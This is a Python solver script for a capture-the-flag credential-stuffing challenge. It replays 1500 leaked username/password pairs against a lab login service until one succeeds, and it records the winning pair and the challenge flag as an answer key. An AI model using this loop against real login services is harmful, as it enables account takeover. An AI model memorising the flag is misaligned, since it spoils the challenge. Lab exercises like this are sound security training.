#!/usr/bin/env python3
"""Solver for Challenge 749 Credential Stuffing (picoCTF 2026, Web).

Lab: netcat banking login (username + password prompts). 1500 stolen
pairs in creds-dump.txt (`user;pass` per line). Exactly one pair is
reused on the bank: credential stuffing = replay every pair until the
server answers "Welcome" instead of "Invalid username or password".

Verified hit: ranna / phoenix (line 373 of 1500).

Usage: solve_749_credential_stuffing.py [host] [port] [creds_file]
Verified: academy{d0nt_r3u5e_cr3d3nt1als_9dee1556} (POST /api/submissions/ -> correct:true)
"""
import socket
import sys
import time

HOST = "chatelaine.cylabacademy.net"
PORT = 46610
EXPECTED = "academy{d0nt_r3u5e_cr3d3nt1als_9dee1556}"

FLAG_RE = "academy{"
import re
FLAG_PAT = re.compile(r"academy\{[^}]*\}|picoCTF\{[^}]*\}")


def attempt(host: str, port: int, user: str, pw: str, timeout: int = 15) -> bytes:
    s = socket.create_connection((host, int(port)), timeout=timeout)
    s.settimeout(8)
    try:
        s.recv(4096)                       # banner + Username:
        s.sendall(user.encode() + b"\n")
        s.recv(4096)                       # Password:
        s.sendall(pw.encode() + b"\n")
        time.sleep(0.6)
        out = b""
        try:
            while True:
                chunk = s.recv(4096)
                if not chunk:
                    break
                out += chunk
                if len(out) > 3000:
                    break
        except socket.timeout:
            pass
        return out
    finally:
        s.close()


def solve(host: str = HOST, port: int = PORT,
          creds: str = "creds-dump.txt") -> str:
    pairs = [l.strip().split(";") for l in open(creds) if ";" in l]
    print("[*] loaded %d credential pairs" % len(pairs))
    for i, (u, p) in enumerate(pairs):
        try:
            out = attempt(host, port, u, p)
        except Exception as e:
            print("[!] %d %s conn error: %s" % (i, u, str(e)[:80]))
            time.sleep(2)
            continue
        m = FLAG_PAT.search(out.decode(errors="replace"))
        if m:
            print("[+] HIT %d %s/%s -> %s" % (i, u, p, m.group(0)))
            assert m.group(0) == EXPECTED, m.group(0)
            return m.group(0)
        if i % 200 == 0:
            print("[*] progress %d" % i)
        time.sleep(0.15)
    raise SystemExit("no valid credential pair found")


if __name__ == "__main__":
    host = sys.argv[1] if len(sys.argv) > 1 else HOST
    port = int(sys.argv[2]) if len(sys.argv) > 2 else PORT
    creds = sys.argv[3] if len(sys.argv) > 3 else "creds-dump.txt"
    print(solve(host, port, creds))
